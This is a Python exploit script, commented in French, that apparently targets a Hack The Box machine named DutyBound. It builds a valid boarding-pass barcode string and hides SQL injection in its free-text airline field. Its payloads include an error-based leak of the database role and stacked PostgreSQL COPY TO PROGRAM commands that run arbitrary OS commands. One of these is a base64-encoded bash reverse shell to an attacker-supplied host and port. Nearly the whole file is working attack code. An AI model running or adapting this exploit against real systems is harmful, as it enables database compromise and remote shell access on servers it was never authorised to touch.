#!/usr/bin/env python3
"""
Crafter d'injection SQL pour DutyBound (HTB).
Place un payload dans le champ 'for individual airline use' (texte libre a la
fin de la section conditionnelle), avec item6/item10/item17 recalcules pour
que le pass soit VALIDE et atteigne record_export_evidence.

Structure conditionnelle :
  '>' + version(6) + item10=len(unique) + unique(11)
      + item17=len(repeated_struct) + repeated_struct
      + AIRLINE_USE  <-- payload SQL ici (texte libre jusqu'a la fin)
item6 = longueur totale de tout ce qui suit item6.

Exemples:
  # test : une quote doit casser le SQL (erreur PostgreSQL)
  python3 bcbp_sqli.py --print --sql "'"
  # fuite du role courant (error-based)
  python3 bcbp_sqli.py --print --sql "'||cast(current_user as int)||'"
  # RCE via COPY TO PROGRAM (stacked query, psycopg2 l'autorise)
  python3 bcbp_sqli.py --print --rce --lhost 10.10.14.5 --lport 9001
  # envoyer directement
  python3 bcbp_sqli.py --target https://airsnacks.htb --cookie 'session=...' --sql "'"
"""
import argparse, json, sys
try:
    import requests; requests.packages.urllib3.disable_warnings()
except ImportError:
    requests=None

MAND = "M1DOE/JOHN            EABC123 CDGHTBAF 0123 365Y012A0001 1"
UNIQUE = "1" + "W" + "W" + "6319" + "B" + "AF "   # 11 octets (item10=0B)
REPEATED_STRUCT = "057"                           # 3 octets (item17=03), connu-bon

def craft(airline_use=""):
    item10 = f"{len(UNIQUE):02X}"                 # 0B
    item17 = f"{len(REPEATED_STRUCT):02X}"        # 03
    cond = ">" + "6" + item10 + UNIQUE + item17 + REPEATED_STRUCT + airline_use
    item6 = f"{len(cond):02X}"
    return MAND + item6 + cond

def send(target, cookie, raw):
    h={"Content-Type":"application/json"}
    if cookie: h["Cookie"]=cookie
    r=requests.post(target.rstrip("/")+"/checkout/boarding-pass/verify",
                    headers=h, data=json.dumps({"raw":raw}), verify=False, timeout=20)
    return r.status_code, r.text

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument("--target"); ap.add_argument("--cookie",default="")
    ap.add_argument("--sql", help="payload brut injecte dans airline-use")
    ap.add_argument("--rce", action="store_true", help="reverse shell base64 via COPY TO PROGRAM")
    ap.add_argument("--sleeptest", type=int, help="test temporel : COPY TO PROGRAM 'sleep N'")
    ap.add_argument("--cmd", help="commande OS brute a executer via COPY TO PROGRAM")
    ap.add_argument("--lhost"); ap.add_argument("--lport", default="9001")
    ap.add_argument("--print", dest="pr", action="store_true")
    a=ap.parse_args()

    import base64 as _b64
    def copy_program(prog):
        # ferme la quote + la parenthese de l'INSERT, stacked query, commentaire final
        return f"'); COPY (SELECT 1) TO PROGRAM $$ {prog} $$; -- "

    if a.sleeptest is not None:
        payload = copy_program(f"sleep {a.sleeptest}")
    elif a.cmd:
        payload = copy_program(a.cmd)
    elif a.rce:
        if not a.lhost: sys.exit("--rce requiert --lhost")
        rev = f"bash -i >& /dev/tcp/{a.lhost}/{a.lport} 0>&1"
        b = _b64.b64encode(rev.encode()).decode()
        # base64 -> evite toute quote imbriquee ; chemins absolus
        payload = copy_program(f"echo {b} | base64 -d | /bin/bash")
    elif a.sql is not None:
        payload = a.sql
    else:
        payload = "'"   # defaut : test de cassure

    raw = craft(payload)
    if a.pr or not a.target:
        print(raw); return
    sc, body = send(a.target, a.cookie, raw)
    print(f"[{sc}] {body[:800]}")

if __name__=="__main__":
    main()
